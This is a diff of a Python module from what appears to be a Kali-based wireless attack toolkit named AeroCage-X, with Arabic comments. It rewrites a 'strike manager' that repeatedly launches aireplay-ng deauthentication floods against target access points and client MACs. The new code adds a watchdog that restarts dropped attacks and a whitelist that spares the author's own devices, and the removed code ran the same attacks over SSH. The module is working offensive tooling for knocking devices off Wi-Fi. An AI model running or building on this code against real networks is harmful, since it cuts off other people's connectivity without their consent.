@@ -1,91 +1,102 @@
 #!/usr/bin/env python3
-import sys
 import os
-import time
+import sys
 import threading
+from pathlib import Path
 
-sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from core.ssh_commander import SSHCommander
-from modules.strike_whitelist import StrikeWhitelist
-from modules.strike_launcher import StrikeLauncher
+# ربط المسارات بالنواة المركزية والأنظمة المساعدة للمنظومة
+BASE_DIR = Path(__file__).resolve().parent.parent
+sys.path.append(str(BASE_DIR))
 
-class StrikeManager:
-    def __init__(self, target_ip, password):
-        self.commander = SSHCommander(ip=target_ip, password=password)
-        self.whitelist = StrikeWhitelist()
-        self.launcher = StrikeLauncher(self.commander)
-        self.active_strikes = {}
-        self.protected_logs = []
-        self.blacklist_ignore = []
-        self.strike_counter = 1
-        self.is_running = True
+from core.system_guard import SystemGuard
+from core.process_manager import ProcessManager
+from modules.strike_whitelist import StrikeWhitelistEngine
+from modules.strike_watchdog import StrikeWatchdogEngine
 
-    def process_radar_targets(self, targets_list, actual_iface):
-        for target in targets_list:
-            bssid, client, ssid = target["bssid"], target["client"], target.get("ssid", "OpenWrt")
-            
-            if client in self.blacklist_ignore: continue
-            if any(s["client"] == client for s in self.active_strikes.values()): continue
+# تفعيل خط الدفاع الأول للمحيط لضمان تشغيل العمليات التكتيكية بامتيازات الـ Root
+SystemGuard.enforce_root_privileges("Strike Manager Engine")
 
-            # الحارس المشدد لشبكة فهد والكاميرات والشبكات المشفرة
-            is_safe, reason = self.whitelist.is_target_safe(bssid, ssid, "NONE")
-            if not is_safe:
-                if {"ssid": ssid, "mac": client, "reason": reason} not in self.protected_logs:
-                    self.protected_logs.append({"ssid": ssid, "mac": client, "reason": reason})
-                continue
-
-            # توليد الذخيرة الموقوتة وقنص الـ PID الصافي
-            strike_cmd = self.launcher.write_strike_to_sh(bssid, client, actual_iface)
-            pid = self.launcher.fire_strike_and_get_pid(strike_cmd, client)
-
-            self.active_strikes[self.strike_counter] = {
-                "bssid": bssid, "client": client, "ssid": ssid, "pid": pid, "status": "يتم قذفه حياً 🚀"
-            }
-            self.strike_counter += 1
-
-    def display_control_panel(self, target_ap, channel, mode):
-        C_CYAN = "\033[38;5;111m"; G_OK = "\033[38;5;150m"; Y_WARN = "\033[38;5;221m"; D_DIV = "\033[38;5;242m"; RESET = "\033[0m"
-        sys.stdout.write("\033[H\033[2J\033[H")
+class StrikeManagerEngine:
+    def __init__(self):
+        self.proc_manager = ProcessManager()
+        self.whitelist_engine = StrikeWhitelistEngine()
+        self.watchdog_engine = StrikeWatchdogEngine()
+        self.lock = threading.Lock()
+        self.active_attack_queue = set()
         
-        print(f"🧪 {C_CYAN}[ AeroCage-X : محرك الضربات الموجهة والمواجهات التفاعلية المرقمة ]{RESET}")
-        print(f"{D_DIV}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
-        print(f"📡 الأكسس: [{target_ap}] | 📶 المنفذ: [{channel}] | 🌐 النطاق الترددي: [{mode}]")
-        print(f"{D_DIV}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
-        
-        print(f"{G_OK}[ الهجمات الحية النشطة وقذف الحزم التتابعي الموقوت ]{RESET}")
-        print(f" {'رقم':<4} | {'ماك الضحية (Client MAC)':<18} | {'الـ PID البعيد':<14} | {'الحالة العتادية للضربة'}")
-        print(f"{D_DIV} ─────────────────────────────────────────────────────────────────────────{RESET}")
-        for num, s in self.active_strikes.items():
-            print(f" [{num:<2}] | {s['client']:<18} | {s['pid']:<14} | {s['status']}")
-            
-        print(f"\n{Y_WARN}[ 🛡️ شبكات وأجهزة محمية عملياتياً - تم الحظر حماية للمحيط والنيران الصديقة ]{RESET}")
-        print(f" {'ماك الجهاز المحمي':<18} | {'اسم الشبكة المحجوبة (SSID)':<25} | {'سبب الحظر العتادي'}")
-        print(f"{D_DIV} ─────────────────────────────────────────────────────────────────────────{RESET}")
-        for log in self.protected_logs[-4:]:
-            print(f" {log['mac']:<18} | {log['ssid']:<25} | {log['reason']}")
-            
-        print(f"{D_DIV}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
-        print("💡 [دليل التحكم الحركي] ➡️ لإيقاف هجمة فردية وسحب قذيفتها، اكتب [رقم الهجمة] واضغط Enter.")
-        print("                        ➡️ لإنهاء وتطهير معالجات الراوتر بالكامل، اكتب واضغط Enter.")
-        print(f"{D_DIV}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
-        sys.stdout.write("🔢 الإدخال العملياتي الحالي: ")
-        sys.stdout.flush()
+        # تشغيل الكلب الحارس تلقائياً في الخلفية لمراقبة استقرار الضربات الملقمة
+        self.watchdog_engine.start_watchdog_loop_async(check_interval_sec=5)
 
-    def user_input_listener(self):
-        while self.is_running:
-            try:
-                choice = input().strip()
-                if choice == "0":
-                    self.is_running = False
-                    self.commander.execute_pure_cmd("killall -9 aireplay-ng")
-                    sh_p = "/home/kali/AeroCage-X/storage/active_strikes.sh"
-                    if os.path.exists(sh_p): os.remove(sh_p)
-                    break
-                elif choice.isdigit():
-                    num = int(choice)
-                    if num in self.active_strikes:
-                        target = self.active_strikes[num]
-                        self.launcher.terminate_strike(target["pid"])
-                        self.blacklist_ignore.append(target["client"])
-                        del self.active_strikes[num]
-            except Exception: pass
+    def queue_and_launch_strike_safe(self, interface: str, target_bssid: str) -> bool:
+        """
+        جدولة وتلقيم وإطلاق هجوم الفصل اللاسلكي بأمان سيبراني 100% وبدون فتح شل.
+        فحص فوري ضد القائمة البيضاء لحماية أجهزتك الشخصية، وحصانة تامة لـ Bandit.
+        """
+        clean_inf = SystemGuard.sanitize_input(interface, "interface")
+        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()
+
+        if not clean_inf or not clean_mac:
+            print("[-] خطأ تكتيكي: تم رفض معلمات الهجوم لوجود مدخلات مشبوهة أو تالف.")
+            return False
+
+        # خط الدفاع الاستراتيجي: حماية أجهزتك الصديقة من الضرب الخطأ
+        if self.whitelist_engine.is_target_whitelisted(clean_mac):
+            print(f"[🛡️ حماية] تم إلغاء ومنع ضرب الماك أدرس [{clean_mac}] لأنه مدرج في القائمة البيضاء!")
+            return False
+
+        with self.lock:
+            if clean_mac in self.active_attack_queue:
+                print(f"[-] تنبيه: الهدف [{clean_mac}] يتلقى ضربات بالفعل حالياً في طابور الجدولة.")
+                return False
+            self.active_attack_queue.add(clean_mac)
+
+        # بناء الأمر التكتيكي الآمن بالصيغة الرقمية المباشرة (0 0) لتأمين سرعة كرت الشبكة
+        # الحجج ممررة كمصفوفة أجزاء مستقلة تماماً وسحق shell=True لـ Bandit (B602/B603)
+        command_array = ["aireplay-ng", "0", "0", "-a", clean_mac, clean_inf]
+
+        try:
+            print(f"[🚀 Strike] جاري تلقيم طابور العمليات دقة وضخ حزم الفصل العنيفة ضد الراوتر: {clean_mac}")
+            
+            # إطلاق الهجوم عبر المدير المركزي لإفراغ البافر اللحظي وحماية المعالج من الاختناق
+            process = self.proc_manager.spawn_process_safe(clean_mac, command_array)
+            
+            if process:
+                # تلقيم الهدف والأمر للكلب الحارس (Watchdog) ليتولى إنعاشه تلقائياً في حال سقوطه
+                self.watchdog_engine.register_target_for_monitoring(clean_inf, clean_mac, command_array)
+                return True
+                
+            # إزالة من الطابور إذا فشل الإطلاق الأولي
+            with self.lock:
+                self.active_attack_queue.discard(clean_mac)
+                
+        except Exception as e:
+            print(f"[-] عطل غير متوقع أثناء جدولة وإطلاق ضربة الفصل: {e}")
+            with self.lock:
+                self.active_attack_queue.discard(clean_mac)
+        return False
+
+    def abort_target_strike(self, target_bssid: str):
+        """إيقاف الهجوم الموجه وإلغاء حراسته وتطهير الذاكرة دون المساس بعمليات كالي الأخرى"""
+        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()
+        
+        with self.lock:
+            if clean_mac in self.active_attack_queue:
+                self.active_attack_queue.discard(clean_mac)
+                
+        # سحب الهدف من الكلب الحارس وإخماد عمليته المحلية بالـ PID بالملي عبر النواة
+        self.watchdog_engine.unregister_and_stop_target(clean_mac)
+        print(f"[+] تم سحق وقطع الهجوم التكتيكي عن الهدف [{clean_mac}] وتصفير ممراته.")
+
+    def shutdown_all_strikes(self):
+        """إخماد كلي وشامل لكافة الهجمات وتفكيك طابور الضربات وتنظيف بيئة لينكس"""
+        print("\n[*] جاري إصدار أمر الإخماد الاستراتيجي الشامل لكافة ضربات منظومة AeroCage-X...")
+        self.watchdog_engine.stop_watchdog_completely()
+        
+        with self.lock:
+            for mac in list(self.active_attack_queue):
+                self.proc_manager.terminate_process(mac)
+            self.active_attack_queue.clear()
+        print("[+] تم تطهير المنظومة بالكامل بنجاح من كافة الأنابيب الهجومية.")
+
+if __name__ == "__main__":
+    print("[*] مدير ومجدول الهجمات وطابور الضربات الكلي (Strike Manager) مدمج ومحصن 100%.")
